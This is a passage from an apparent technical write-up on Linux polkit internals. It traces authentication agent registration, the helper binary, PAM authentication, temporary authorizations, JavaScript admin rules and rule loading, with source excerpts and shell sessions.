Let's take the **remote power-off** action as an example. Because the process is running in a remote session, `polkitd` requires authentication. In this case, the `polkit-agent-helper` is invoked to prompt the user for a password.

``` bash
dbus-test@DBUS-VM:~$ pkcheck --action-id org.freedesktop.login1.power-off --enable-internal-agent --allow-user-interaction --process $$
polkit\56retains_authorization_after_challenge=1
==== AUTHENTICATING FOR org.freedesktop.login1.power-off ====
Authentication is required to power off the system.
Authenticating as: dbus-test
Password:
[1]+  Stopped                 pkcheck --action-id org.freedesktop.login1.power-off --enable-internal-agent --allow-user-interaction --process $$

dbus-test@DBUS-VM:~$ ps aux | grep agent-helper
root       14881  0.0  0.0  14316  6412 pts/2    T    16:40   0:00 /usr/lib/polkit-1/polkit-agent-helper-1 dbus-test
```

#### 2.5.1. Authentication Agent Registration

When `pkcheck` is executed, it first calls the `CheckAuthorization` method on the `org.freedesktop.PolicyKit1.Authority` interface [1] to determine whether the subject is authorized to perform the requested action.

In this case, due to the action policy specifying:

```
<allow_any>auth_admin_keep</allow_any>
```

the result of the check is **"is_challenge=1"**. This means the subject is not currently authorized, but may be authorized if proper authentication is provided.

As a result, `pkcheck` proceeds to initiate the authentication process and starts a agent by calling `polkit_agent_listener_register()` [2] to register a listener to handle interactive authentication.

``` c
// src/programs/pkcheck.c
int
main (int argc, char *argv[])
{
  // [...]
  result = polkit_authority_check_authorization_sync (authority, // [1]
                                                      subject,
                                                      action_id,
                                                      details,
                                                      flags,
                                                      NULL,
                                                      &error);
  if (polkit_authorization_result_get_is_authorized (result))
    {
      // [...]
    }
  else if (polkit_authorization_result_get_is_challenge (result)) {
    if (allow_user_interaction)
        {
          if (local_agent_handle == NULL && enable_internal_agent)
            {
              PolkitAgentListener *listener;
              error = NULL;
              // [...]
              listener = polkit_agent_text_listener_new (NULL, &error);
              local_agent_handle = polkit_agent_listener_register (listener, // [2]
                                                                   POLKIT_AGENT_REGISTER_FLAGS_RUN_IN_THREAD,
                                                                   subject,
                                                                   NULL, /* object_path */
                                                                   NULL, /* GCancellable */
                                                                   &error);
            }
        }
        // [...]
  }
}
```

The `polkit_agent_listener_register_with_options()` function is called internally to register an authentication agent. It performs several key steps during initialization:
1. It first exports the `org.freedesktop.PolicyKit1.AuthenticationAgent` dbus interface [3], which exposes two methods: `BeginAuthentication` [4] and `CancelAuthentication` [5].
2. Then, it spawns a new thread to handle authentication requests asynchronously [6].
3. Finally, it calls `server_register()` to complete the registration of the authentication agent on the dbus [7].

``` c
// src/polkitagent/polkitagentlistener.c

static const gchar *auth_agent_introspection_data =
  "<node>"
  "  <interface name='org.freedesktop.PolicyKit1.AuthenticationAgent'>"
  "    <method name='BeginAuthentication'>" // [4]
  "      <arg type='s' name='action_id' direction='in'/>"
  "      <arg type='s' name='message' direction='in'/>"
  "      <arg type='s' name='icon_name' direction='in'/>"
  "      <arg type='a{ss}' name='details' direction='in'/>"
  "      <arg type='s' name='cookie' direction='in'/>"
  "      <arg type='a(sa{sv})' name='identities' direction='in'/>"
  "    </method>"
  "    <method name='CancelAuthentication'>" // [5]
  "      <arg type='s' name='cookie' direction='in'/>"
  "    </method>"
  "  </interface>"
  "</node>";

gpointer
polkit_agent_listener_register_with_options (PolkitAgentListener      *listener,
                                             PolkitAgentRegisterFlags  flags,
                                             PolkitSubject            *subject,
                                             const gchar              *object_path,
                                             GVariant                 *options,
                                             GCancellable             *cancellable,
                                             GError                  **error)
{
  // [...]
  if (object_path == NULL)
    object_path = "/org/freedesktop/PolicyKit1/AuthenticationAgent";
  
  // [...]
  server = server_new (subject, object_path, cancellable, error);
  node_info = g_dbus_node_info_new_for_xml (auth_agent_introspection_data, error);
  server->interface_info = g_dbus_interface_info_ref (g_dbus_node_info_lookup_interface (node_info, "org.freedesktop.PolicyKit1.AuthenticationAgent")); // [3]
  
  // [...]
  server->thread = g_thread_try_new ("polkit agent listener", // [6]
					 server_thread_func, server, error);

  // [...]
  if (!server_register (server, error)) // [7]
    {
      server_free (server);
      server = NULL;
      goto out;
    }
  // [...]
}
```

Internally, the function `polkit_authority_register_authentication_agent_with_options()` is responsible for initiating the registration of an authentication agent. It does so by invoking the `RegisterAuthenticationAgent` method on the authority object, which results in a dbus method call being sent to `polkitd`.

``` c
// src/polkit/polkitauthority.c
void
polkit_authority_register_authentication_agent_with_options (PolkitAuthority      *authority,
                                                             PolkitSubject        *subject,
                                                             const gchar          *locale,
                                                             const gchar          *object_path,
                                                             GVariant             *options,
                                                             GCancellable         *cancellable,
                                                             GAsyncReadyCallback   callback,
                                                             gpointer              user_data)
{
  // [...]
  else
    {
      g_dbus_proxy_call (authority->proxy,
                         "RegisterAuthenticationAgent",
                         g_variant_new ("(@(sa{sv})ss)",
                                        subject_value,
                                        locale,
                                        object_path),
                         /* ... */);
    }
  // [...]
}
```

In `polkitd`, the function `server_handle_method_call()` is responsible for dispatching incoming dbus method calls. When the method name is `RegisterAuthenticationAgent`, the call is forwarded to `server_handle_register_authentication_agent()` [8]:

``` c
// src/polkitbackend/polkitbackendauthority.c
static void
server_handle_method_call (GDBusConnection        *connection,
                           const gchar            *sender,
                           const gchar            *object_path,
                           const gchar            *interface_name,
                           const gchar            *method_name,
                           GVariant               *parameters,
                           GDBusMethodInvocation  *invocation,
                           gpointer                user_data)
{
  Server *server = user_data;
  PolkitSubject *caller;

  caller = polkit_system_bus_name_new (g_dbus_method_invocation_get_sender (invocation));
  // [...]
  else if (g_strcmp0 (method_name, "RegisterAuthenticationAgent") == 0)
    server_handle_register_authentication_agent (server, parameters, caller, invocation); // [8]
  // [...]
}
```

The function `polkit_backend_interactive_authority_register_authentication_agent()` is called internally. It performs the following key steps:
1. It retrieves user information from the subject [9].
2. Then it creates an `AuthenticationAgent` object [10].
3. Finally, the agent is added to the `priv->hash_scope_to_authentication_agent` hash table for later lookup [11].

``` c
// src/polkitbackend/polkitbackendinteractiveauthority.c
static gboolean
polkit_backend_interactive_authority_register_authentication_agent (PolkitBackendAuthority   *authority,
                                                                    PolkitSubject            *caller,
                                                                    PolkitSubject            *subject,
                                                                    const gchar              *locale,
                                                                    const gchar              *object_path,
                                                                    GVariant                 *options,
                                                                    GError                  **error)
{
  // [...]
  user_of_subject = polkit_backend_session_monitor_get_user_for_subject (priv->session_monitor, subject, &user_of_subject_matches, NULL); // [9]

  // [...]
  agent = authentication_agent_new (priv->agent_serial, // [10]
                                    subject,
                                    user_of_subject,
                                    polkit_system_bus_name_get_name (POLKIT_SYSTEM_BUS_NAME (caller)),
                                    locale,
                                    object_path,
                                    options,
                                    error);
  
  // [...]
  g_hash_table_insert (priv->hash_scope_to_authentication_agent, // [11]
                       g_object_ref (subject),
                       agent);
}
```

The `authentication_agent_new()` function constructs a proxy object that represents the remote authentication agent. This proxy will later be used to invoke the `AuthenticationAgent` interface methods on the subject:

``` c
// src/polkitbackend/polkitbackendinteractiveauthority.c
static AuthenticationAgent *
authentication_agent_new (guint64      serial,
                          PolkitSubject *scope,
                          PolkitIdentity *creator,
                          const gchar *unique_system_bus_name,
                          const gchar *locale,
                          const gchar *object_path,
                          GVariant    *registration_options,
                          GError     **error)
{
  proxy = g_dbus_proxy_new_for_bus_sync (G_BUS_TYPE_SYSTEM,
                                         G_DBUS_PROXY_FLAGS_DO_NOT_LOAD_PROPERTIES |
                                         G_DBUS_PROXY_FLAGS_DO_NOT_CONNECT_SIGNALS,
                                         NULL, /* GDBusInterfaceInfo* */
                                         unique_system_bus_name,
                                         object_path,
                                         "org.freedesktop.PolicyKit1.AuthenticationAgent",
                                         NULL, /* GCancellable* */
                                         error);
  // [...]
  agent = g_new0 (AuthenticationAgent, 1);
  
  // [...]
  agent->proxy = proxy;
  
  // [...]
  return agent;
}
```

Brief Summary:
1. `pkcheck` registers the `org.freedesktop.PolicyKit1.AuthenticationAgent` interface and calls the `RegisterAuthenticationAgent` method on `polkitd`.
2. Upon receiving the request, `polkitd` creates an authentication agent by constructing a proxy object that points to the subject's (i.e., pkcheck's) `org.freedesktop.PolicyKit1.AuthenticationAgent` interface. This agent object is then stored in a hash table for later use during authentication flows.

#### 2.5.2. Start authenticating

After registering an authentication agent, `pkcheck` calls the `CheckAuthorization` method again [1].

``` c
// src/programs/pkcheck.c
int
main (int argc, char *argv[])
{
 try_again:
  // [...]
  result = polkit_authority_check_authorization_sync (authority, // [1]
                                                      subject,
                                                      action_id,
                                                      details,
                                                      flags,
                                                      NULL,
                                                      &error);
  // [...]
  else if (polkit_authorization_result_get_is_challenge (result)) {
    if (allow_user_interaction)
        {
          if (local_agent_handle == NULL && enable_internal_agent)
            {
              // [...]
              local_agent_handle = polkit_agent_listener_register (/*...*/);
              // [...]
              goto try_again;
            }
        }
        // [...]
  }
}
```

This time, when the `CheckAuthorization` handler calls `polkit_backend_interactive_authority_check_authorization()`, the function finds that the subject exists in the authentication agent hash table [2]. It then invokes `authentication_agent_initiate_challenge()` with the callback function `check_authorization_challenge_cb()` [3] to initiate the authentication process.

``` c
// src/polkitbackend/polkitbackendinteractiveauthority.c
static void
polkit_backend_interactive_authority_check_authorization (PolkitBackendAuthority         *authority,
                                                          PolkitSubject                  *caller,
                                                          PolkitSubject                  *subject,
                                                          const gchar                    *action_id,
                                                          PolkitDetails                  *details,
                                                          PolkitCheckAuthorizationFlags   flags,
                                                          GCancellable                   *cancellable,
                                                          GAsyncReadyCallback             callback,
                                                          gpointer                        user_data)
{
  // [...]
  result = check_authorization_sync (authority,
                                     caller,
                                     subject,
                                     action_id,
                                     details,
                                     flags,
                                     &implicit_authorization,
                                     FALSE, /* checking_imply */
                                     &error);
  
  // [...]
  if (polkit_authorization_result_get_is_challenge (result) &&
      (flags & POLKIT_CHECK_AUTHORIZATION_FLAGS_ALLOW_USER_INTERACTION))
    {
      AuthenticationAgent *agent;

      agent = get_authentication_agent_for_subject (interactive_authority, subject); // [2]
      if (agent != NULL)
        {
          // [...]
          authentication_agent_initiate_challenge (agent,
                                                   subject,
                                                   user_of_subject,
                                                   interactive_authority,
                                                   action_id,
                                                   details,
                                                   caller,
                                                   implicit_authorization,
                                                   cancellable,
                                                   check_authorization_challenge_cb, // [3]
                                                   simple);

          /* keep going */
          goto out;
        }
    }
}
```

The `authentication_agent_initiate_challenge()` function creates a session object and invokes the `BeginAuthentication` method on the subject's interface. The callback function for the session is provided by the caller [4], which in this case is `check_authorization_challenge_cb()`.

``` c
// src/polkitbackend/polkitbackendinteractiveauthority.c
static void
authentication_agent_initiate_challenge (AuthenticationAgent         *agent,
                                         PolkitSubject               *subject,
                                         PolkitIdentity              *user_of_subject,
                                         PolkitBackendInteractiveAuthority *authority,
                                         const gchar                 *action_id,
                                         PolkitDetails               *details,
                                         PolkitSubject               *caller,
                                         PolkitImplicitAuthorization  implicit_authorization,
                                         GCancellable                *cancellable,
                                         AuthenticationAgentCallback  callback,
                                         gpointer                     user_data)
{
  // [...]
  session = authentication_session_new (agent,
                                        subject,
                                        user_of_subject,
                                        caller,
                                        authority,
                                        user_identities,
                                        action_id,
                                        details,
                                        polkit_system_bus_name_get_name (POLKIT_SYSTEM_BUS_NAME (caller)),
                                        implicit_authorization,
                                        cancellable,
                                        callback, // [4]
                                        user_data);
  // [...]
  g_dbus_proxy_call (agent->proxy,
                     "BeginAuthentication",
                     parameters, /* consumes the floating GVariant */
                     G_DBUS_CALL_FLAGS_NONE,
                     G_MAXINT, /* timeout_msec - no timeout */
                     session->cancellable,
                     (GAsyncReadyCallback) authentication_agent_begin_cb,
                     session);
  // [...]
}
```

The `authentication_session_new()` function initializes the session members, including generating a cookie for the session to represent the authentication process.

``` c
// src/polkitbackend/polkitbackendinteractiveauthority.c
static AuthenticationSession *
authentication_session_new (AuthenticationAgent         *agent,
                            PolkitSubject               *subject,
                            PolkitIdentity              *user_of_subject,
                            PolkitSubject               *caller,
                            PolkitBackendInteractiveAuthority *authority,
                            GList                       *identities,
                            const gchar                 *action_id,
                            PolkitDetails               *details,
                            const gchar                 *initiated_by_system_bus_unique_name,
                            PolkitImplicitAuthorization  implicit_authorization,
                            GCancellable                *cancellable,
                            AuthenticationAgentCallback  callback,
                            gpointer                     user_data)
{
  // [...]
  session = g_new0 (AuthenticationSession, 1);
  // [...]
  session->cookie = authentication_agent_generate_cookie (agent);
  // [...]
}
```

#### 2.5.3. Execute Polkit Agent Helper

When the server thread of `pkcheck` receives a `BeginAuthentication` request, it triggers the call to `polkit_agent_listener_initiate_authentication()` to handle the authentication process [1].

``` c
// src/polkitagent/polkitagentlistener.c
static void
auth_agent_handle_method_call (GDBusConnection        *connection,
                               const gchar            *sender,
                               const gchar            *object_path,
                               const gchar            *interface_name,
                               const gchar            *method_name,
                               GVariant               *parameters,
                               GDBusMethodInvocation  *invocation,
                               gpointer                user_data)
{
  // [...]
  if (g_strcmp0 (method_name, "BeginAuthentication") == 0)
    auth_agent_handle_begin_authentication (server, parameters, invocation); // <-------------
  // [...]
}

static void
auth_agent_handle_begin_authentication (Server                 *server,
                                        GVariant               *parameters,
                                        GDBusMethodInvocation  *invocation)
{
  // [...]
  polkit_agent_listener_initiate_authentication (server->listener, // [1]
                                                 action_id,
                                                 message,
                                                 icon_name,
                                                 details,
                                                 cookie,
                                                 identities,
                                                 data->cancellable,
                                                 auth_cb,
                                                 data);
  // [...]
}
```

Internally, `polkit_agent_text_listener_initiate_authentication()` is invoked. It prints a prompt message to the TTY and then calls `polkit_agent_session_initiate()` [2] to begin the authentication session.

``` c
// src/polkitagent/polkitagenttextlistener.c
static void
polkit_agent_text_listener_initiate_authentication (PolkitAgentListener  *_listener,
                                                    const gchar          *action_id,
                                                    const gchar          *message,
                                                    const gchar          *icon_name,
                                                    PolkitDetails        *details,
                                                    const gchar          *cookie,
                                                    GList                *identities,
                                                    GCancellable         *cancellable,
                                                    GAsyncReadyCallback   callback,
                                                    gpointer              user_data)
{
  // [...]
  fprintf (listener->tty,
           "==== AUTHENTICATING FOR %s ====\n",
           action_id);
  
  // [...]
  listener->active_session = polkit_agent_session_new (identity, cookie);
  
  // [...]
  polkit_agent_session_initiate (listener->active_session); // [2]
}
```

Inside the `polkit_agent_session_initiate()` function, the Polkit agent helper binary `polkit-agent-helper-1` [3] is executed to carry out the actual authentication.

``` c
// src/polkitagent/polkitagentsession.c
void
polkit_agent_session_initiate (PolkitAgentSession *session)
{
  // [...]
  if (session->child_stdout == -1)
    {
      helper_argv[0] = PACKAGE_PREFIX "/lib/polkit-1/polkit-agent-helper-1"; // [3]
      helper_argv[1] = passwd->pw_name;
      helper_argv[2] = NULL;

      error = NULL;
      if (!g_spawn_async_with_pipes (NULL,
                                    (char **) helper_argv,
                                    NULL,
                                    G_SPAWN_DO_NOT_REAP_CHILD |
                                    0,//G_SPAWN_STDERR_TO_DEV_NULL,
                                    NULL,
                                    NULL,
                                    &session->child_pid,
                                    &stdin_fd,
                                    &session->child_stdout,
                                    NULL,
                                    &error))
    }
  // [...]
}
```

#### 2.5.4. Actual Authentication

The Polkit agent helper performs three main tasks: it retrieves the authentication agent cookie [1], carries out PAM-based authentication [2], and sends the authentication result to `polkitd` [3].

``` c
// src/polkitagent/polkitagenthelper-pam.c
int
main (int argc, char *argv[])
{
  // [...]
  cookie = read_cookie (argc, argv); // [1]
  
  // [...]
  rc = pam_authenticate (pam_h, 0); // [2]

  // [...]
  send_dbus_message (cookie, user_to_auth, pidfd, uid); // [3]
}
```

The `send_dbus_message()` function internally invokes `polkit_authority_authentication_agent_response()` to send an `AuthenticationAgentResponse2` request containing the authentication result.

``` c
// src/polkit/polkitauthority.c
void
polkit_authority_authentication_agent_response (PolkitAuthority      *authority,
                                                const gchar          *cookie,
                                                PolkitIdentity       *identity,
                                                GCancellable         *cancellable,
                                                GAsyncReadyCallback   callback,
                                                gpointer              user_data)
{
  // [...]
  g_dbus_proxy_call (authority->proxy,
                     "AuthenticationAgentResponse2",
                     g_variant_new ("(us@(sa{sv}))",
                                    (guint32)uid,
                                    cookie,
                                    polkit_identity_to_gvariant (identity)),
                     /*...*/);
  // [...]
}
```

Within `polkitd`, the `AuthenticationAgentResponse2` method is handled by `polkit_backend_interactive_authority_authentication_agent_response()`. This function first **verifies that the caller's UID is 0** [4], ensuring that only processes running as root can submit authentication results, thereby preventing regular users from impersonating the agent.

It then retrieves the authentication session using the provided cookie [5], and finally marks the session as successfully authenticated [6].

``` c
// src/polkitbackend/polkitbackendinteractiveauthority.c
static gboolean
polkit_backend_interactive_authority_authentication_agent_response (PolkitBackendAuthority   *authority,
                                                                    PolkitSubject            *caller,
                                                                    uid_t                     uid,
                                                                    const gchar              *cookie,
                                                                    PolkitIdentity           *identity,
                                                                    GError                  **error)
{
  // [...]
  user_of_caller = polkit_backend_session_monitor_get_user_for_subject (priv->session_monitor,
                                                                        caller, NULL,
                                                                        error);
  // [...]
  /* only uid 0 is allowed to invoke this method */
  if (!identity_is_root_user (user_of_caller)) // [4]
    {
      // [...]
      goto out;
    }
  // [...]
  session = get_authentication_session_for_uid_and_cookie (interactive_authority, uid, cookie); // [5]

  // [...]
  session->is_authenticated = TRUE; // [6]
}
```

#### 2.5.5. Send Back The Authentication Result

Once authentication is complete, the callback function `authentication_agent_begin_cb()` — registered for the `BeginAuthentication` method — is invoked [1].

``` c
// src/polkitbackend/polkitbackendinteractiveauthority.c
static void
authentication_agent_initiate_challenge (AuthenticationAgent         *agent,
                                         PolkitSubject               *subject,
                                         PolkitIdentity              *user_of_subject,
                                         PolkitBackendInteractiveAuthority *authority,
                                         const gchar                 *action_id,
                                         PolkitDetails               *details,
                                         PolkitSubject               *caller,
                                         PolkitImplicitAuthorization  implicit_authorization,
                                         GCancellable                *cancellable,
                                         AuthenticationAgentCallback  callback,
                                         gpointer                     user_data)
{
  // [...]
  g_dbus_proxy_call (agent->proxy,
                     "BeginAuthentication",
                     parameters, /* consumes the floating GVariant */
                     G_DBUS_CALL_FLAGS_NONE,
                     G_MAXINT, /* timeout_msec - no timeout */
                     session->cancellable,
                     (GAsyncReadyCallback) authentication_agent_begin_cb, // [1]
                     session);
  // [...]
}
```

This function subsequently invokes the session callback [2], which is `check_authorization_challenge_cb()`.

``` c
// src/polkitbackend/polkitbackendinteractiveauthority.c
static void
authentication_agent_begin_cb (GDBusProxy   *proxy,
                               GAsyncResult *res,
                               gpointer      user_data)
{
  // [...]
  session->callback (session->agent, // [2]
                     session->subject,
                     session->user_of_subject,
                     session->caller,
                     session->authority,
                     session->action_id,
                     session->details,
                     session->implicit_authorization,
                     gained_authorization,
                     was_dismissed,
                     session->authenticated_identity,
                     session->user_data);
  // [...]
}
```

The `check_authorization_challenge_cb()` function updates the internal state of the subject and the requested action based on the authentication result. For example, if the implicit authorization level includes the `"keep"` suffix (e.g., `"auth_admin_keep"`), it generates a temporary authorization token for the subject [3]. Finally, it calls `g_simple_async_result_complete()` [4] to return the result to the caller — in this case, `pkcheck`.

``` c
// src/polkitbackend/polkitbackendinteractiveauthority.c
static void
check_authorization_challenge_cb (AuthenticationAgent         *agent,
                                  PolkitSubject               *subject,
                                  PolkitIdentity              *user_of_subject,
                                  PolkitSubject               *caller,
                                  PolkitBackendInteractiveAuthority *authority,
                                  const gchar                 *action_id,
                                  PolkitDetails               *details,
                                  PolkitImplicitAuthorization  implicit_authorization,
                                  gboolean                     authentication_success,
                                  gboolean                     was_dismissed,
                                  PolkitIdentity              *authenticated_identity,
                                  gpointer                     user_data)
{
  if (authentication_success)
    {
      /* store temporary authorization depending on value of implicit_authorization */
      if (implicit_authorization == POLKIT_IMPLICIT_AUTHORIZATION_AUTHENTICATION_REQUIRED_RETAINED ||
          implicit_authorization == POLKIT_IMPLICIT_AUTHORIZATION_ADMINISTRATOR_AUTHENTICATION_REQUIRED_RETAINED)
        {
          const gchar *id;
          // [...]
          id = temporary_authorization_store_add_authorization (priv->temporary_authorization_store, // [3]
                                                                subject,
                                                                authentication_agent_get_scope (agent),
                                                                action_id);
        }
    }
  
  // [...]
  g_simple_async_result_complete (simple); // [4]

  // [...]
}
```

Here's an example of a successful authentication flow:

``` bash
dbus-test@DBUS-VM:~$ pkcheck --action-id org.freedesktop.login1.power-off --enable-internal-agent --allow-user-interaction --process $$
polkit\56retains_authorization_after_challenge=1
==== AUTHENTICATING FOR org.freedesktop.login1.power-off ====
Authentication is required to power off the system.
Authenticating as: dbus-test
Password:
==== AUTHENTICATION COMPLETE ====
polkit\56temporary_authorization_id=tmpauthz0
polkit\56retains_authorization_after_challenge=true
```

and an execution flow diagram:

<img src="/assets/image-20250524233004178.png" alt="image-20250524233004178" style="display: block; margin-left: auto; margin-right: auto; zoom:50%;" />

After that, we can use `busctl` to call the `PowerOff` method on the `org.freedesktop.login1.Manager` interface. When `systemd-logind` (implemented as `/usr/lib/systemd/systemd-logind`) receives the request, it sends a `CheckAuthorization` request to `polkitd` to determine whether the sender is authorized. 

Since we previously used pkcheck to authorize the action — and the authentication result is cached for a few minutes due to the `"auth_admin_keep"` authentication level — `polkitd` will return `is_auth=1`, and `systemd-logind` will **proceed to power off the machine**.

### 2.6. Remote PowerOff

To power off the machine from a remote session via dbus services, we first write a Python script and print its PID before sending the power-off request.

``` python
from pydbus import SystemBus
from gi.repository import GLib
import os

bus = SystemBus()
polkit = bus.get("org.freedesktop.login1", "/org/freedesktop/login1")

print(f"pid: {os.getpid()}")
input("")
polkit.PowerOff(1)
```

Next, we stop the python process and execute `pkcheck`, specifying the Python script's PID as the subject process:

``` bash
dbus-test@DBUS-VM:~$ pkcheck --action-id org.freedesktop.login1.power-off --enable-internal-agent --allow-user-interaction --process <python_script_pid>
...
==== AUTHENTICATION COMPLETE ====
...
```

After authentication, we can resume the python process, and the `polkit.PowerOff()` call will succeed.

<br>

Alternatively, you can authenticate the current shell process and then `exec` a `busctl` command to send the power-off request. Since `exec` replaces the current process with a new one, the subject remains the same:

``` bash
dbus-test@DBUS-VM:~$ pkcheck --action-id org.freedesktop.login1.power-off --enable-internal-agent --allow-user-interaction --process $$
...
==== AUTHENTICATION COMPLETE ====
...

exec busctl --system call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager PowerOff b 1
```

### 2.7. Admin User

When the user `dummy_user` (UID 1001) executes `pkcheck` to gain authentication, the prompt shows that `polkitd` is attempting to authenticate as the user `dbus-test` (UID 1000). Why is this happening?

``` bash
dummy_user@DBUS-VM:~$ id
uid=1001(dummy_user) gid=1001(dummy_user) groups=1001(dummy_user)

dummy_user@DBUS-VM:~$ pkcheck --action-id org.freedesktop.login1.power-off --enable-internal-agent --allow-user-interaction --process $$
polkit\56retains_authorization_after_challenge=1
==== AUTHENTICATING FOR org.freedesktop.login1.power-off ====
Authentication is required to power off the system.
Authenticating as: dbus-test
Password:
```

When administrator authentication is required [1] (i.e., `"auth_admin"` or `"auth_admin_keep"`), `polkitd` first retrieves the list of **administrator identities** [2]. These identities are later used to create an authentication session [3], which is reflected in the prompt text as `"Authenticating as"`.

This means that a regular user (e.g., `dummy_user`) must authenticate as, or be authorized by, one of the **administrator identities** (e.g., `dbus-test`) in order to perform privileged operations.

``` c
// src/polkitbackend/polkitbackendinteractiveauthority.c
static void
authentication_agent_initiate_challenge (AuthenticationAgent         *agent,
                                         PolkitSubject               *subject,
                                         PolkitIdentity              *user_of_subject,
                                         PolkitBackendInteractiveAuthority *authority,
                                         const gchar                 *action_id,
                                         PolkitDetails               *details,
                                         PolkitSubject               *caller,
                                         PolkitImplicitAuthorization  implicit_authorization,
                                         GCancellable                *cancellable,
                                         AuthenticationAgentCallback  callback,
                                         gpointer                     user_data)
{
  // [...]
  if (implicit_authorization == POLKIT_IMPLICIT_AUTHORIZATION_ADMINISTRATOR_AUTHENTICATION_REQUIRED ||
      implicit_authorization == POLKIT_IMPLICIT_AUTHORIZATION_ADMINISTRATOR_AUTHENTICATION_REQUIRED_RETAINED) // [1]
    {
      // [...]
      identities = polkit_backend_interactive_authority_get_admin_identities (authority, // [2]
                                                                              caller,
                                                                              subject,
                                                                              user_of_subject,
                                                                              is_local,
                                                                              is_active,
                                                                              action_id,
                                                                              details);
    }
  // [...]
  user_identities = NULL;
  for (l = identities; l != NULL; l = l->next)
    {
      PolkitIdentity *identity = POLKIT_IDENTITY (l->data);
      if (POLKIT_IS_UNIX_USER (identity))
        {
          user_identities = g_list_append (user_identities, g_object_ref (identity));
        }
      else if (POLKIT_IS_UNIX_GROUP (identity))
        {
          user_identities = g_list_concat (user_identities, get_users_in_group (identity, user_of_subject, FALSE));
        }
      else if (POLKIT_IS_UNIX_NETGROUP (identity))
        {
          user_identities =  g_list_concat (user_identities, get_users_in_net_group (identity, FALSE));
        }
      else
        {
          g_warning ("Unsupported identity");
        }
    }
  // [...]
  session = authentication_session_new (/*...*/, user_identities, /*...*/); // [3]
  // [...]
}
```

The function `polkit_backend_common_js_authority_get_admin_auth_identities()` is called internally to retrieve administrator identities. It first pushes two strings onto the duk context [4]: `"polkit"` and `"_runAdminRules"`. It then pushes the action ID [5] and subject information [6] as arguments. The duk context refers to the JavaScript runtime environment provided by [Duktape](https://duktape.org), **an embeddable JavaScript engine**. (Interesting!)

After that, it invokes the JS function using `call_js_function_with_runaway_killer()` [7]. The function returns a comma-separated string of administrator identity names, which is then parsed and converted into `PolkitIdentity` objects [8].

``` c
// src/polkitbackend/polkitbackendduktapeauthority.c
GList *
polkit_backend_common_js_authority_get_admin_auth_identities (PolkitBackendInteractiveAuthority *_authority,
                                                              PolkitSubject                     *caller,
                                                              PolkitSubject                     *subject,
                                                              PolkitIdentity                    *user_for_subject,
                                                              gboolean                           subject_is_local,
                                                              gboolean                           subject_is_active,
                                                              const gchar                       *action_id,
                                                              PolkitDetails                     *details)
{
  duk_context *cx = authority->priv->cx;

  // [...]
  duk_get_global_string (cx, "polkit"); // [4]
  
  // [...]
  duk_push_string (cx, "_runAdminRules");
  
  // [...]
  push_action_and_details (cx, action_id, details); // [5]
  
  // [...]
  push_subject (cx, subject, user_for_subject, subject_is_local, subject_is_active, &error); // [6]
  
  // [...]
  call_js_function_with_runaway_killer (authority); // [7]
  
  // [...]
  ret_str = duk_require_string (cx, -1);
  ret_strs = g_strsplit (ret_str, ",", -1);
  for (n = 0; ret_strs != NULL && ret_strs[n] != NULL; n++)
    {
      const gchar *identity_str = ret_strs[n];
      PolkitIdentity *identity;

      // [...]
      identity = polkit_identity_from_string (identity_str, &error); // [8]
      ret = g_list_prepend (ret, identity);
      // [...]
    }
}
```

The JS function is defined in `init.js`. It iterates over the `_adminRuleFuncs` list [9], invoking each function in the list as a callback with `action` and `subject` as arguments. The first function that returns a non-null result is used [10], and its return value (an array of identity strings) is joined into a single comma-separated string [11].

``` js
// src/polkitbackend/init.js
polkit._adminRuleFuncs = [];
polkit.addAdminRule = function(callback) {this._adminRuleFuncs.push(callback);};
polkit._runAdminRules = function(action, subject) {
    var ret = null;
    for (var n = 0; n < this._adminRuleFuncs.length; n++) { // [9]
        var func = this._adminRuleFuncs[n];
        var func_ret = func(action, subject);
        if (func_ret) {
            ret = func_ret; // [10]
            break
        }
    }
    return ret ? ret.join(",") : ""; // [11]
};
```

During the initialization of `polkitd`, a JavaScript context is created, and all Polkit rule files located in `/usr/share/polkit-1/rules.d/` are executed within that context. In fact, these rule files are JavaScript files and may call `polkit.addAdminRule()` to register a callback function. These registered functions are later invoked when retrieving administrator identities.

In my environment, only two rule files in the directory call `polkit.addAdminRule()`: `49-ubuntu-admin.rules` and `50-default.rules`.

The `49-ubuntu-admin.rules` file registers a callback function that returns two unix groups: `sudo` and `admin`.

``` js
// /usr/share/polkit-1/rules.d/49-ubuntu-admin.rules
polkit.addAdminRule(function(action, subject) {
    return ["unix-group:sudo", "unix-group:admin"];
});
```

The `50-default.rules` file registers a callback function that returns only one unix group: `sudo`.

``` js
// /usr/share/polkit-1/rules.d/50-default.rules
polkit.addAdminRule(function(action, subject) {
    return ["unix-group:sudo"];
})
```

Since `49-ubuntu-admin.rules` has a higher priority than `50-default.rules`, its callback function will be invoked first during admin identity resolution.

So, on Ubuntu, **the `admin` group is effectively equivalent to the `sudo` group** in terms of privilege delegation. This can be confirmed in the comments within the `/etc/sudoers` file:

```
...
# Members of the admin group may gain root privileges
%admin ALL=(ALL) ALL

# Allow members of group sudo to execute any command
%sudo   ALL=(ALL:ALL) ALL
...
```

### 2.8. Import Rules

After understanding how admin rules are loaded, we can now look into how other rules are imported and executed.

First, `polkitd` runs `init.js`, which defines the `addRule` function and executes all rule files located in `/usr/share/polkit-1/rules.d/*.rules`.

``` js
// src/polkitbackend/init.js
polkit._ruleFuncs = [];
polkit.addRule = function(callback) {this._ruleFuncs.push(callback);};
polkit._runRules = function(action, subject) {
    var ret = null;
    for (var n = 0; n < this._ruleFuncs.length; n++) {
        var func = this._ruleFuncs[n];
        var func_ret = func(action, subject);
        if (func_ret) {
            ret = func_ret;
            break
        }
    }
    return ret;
};
```

Next, rule files call `polkit.addRule()` to register callback functions into the `polkit._ruleFuncs` array.

``` js
// /usr/share/polkit-1/rules.d/20-gnome-initial-setup.rules
polkit.addRule(function(action, subject) {
    if (subject.user !== 'gnome-initial-setup')
        return undefined;

    var actionMatches = (action.id.indexOf('org.freedesktop.hostname1.') === 0 ||
                         /*...*/);

    if (actionMatches) {
        if (subject.local)
            return 'yes';
        else
            return 'auth_admin';
    }

    return undefined;
});
```

When `polkitd` receives a `CheckAuthorization` request, it calls `check_authorization_sync()` to determine the appropriate authentication level. 

Initially, it tries to get the level directly from the **action policies** [1, 2, 3], depending on session state. Then it delegates to `polkit_backend_interactive_authority_check_authorization_sync()` to allow further evaluation via **rules** [4].

``` c
static PolkitAuthorizationResult *
check_authorization_sync (PolkitBackendAuthority         *authority,
                          PolkitSubject                  *caller,
                          PolkitSubject                  *subject,
                          const gchar                    *action_id,
                          PolkitDetails                  *details,
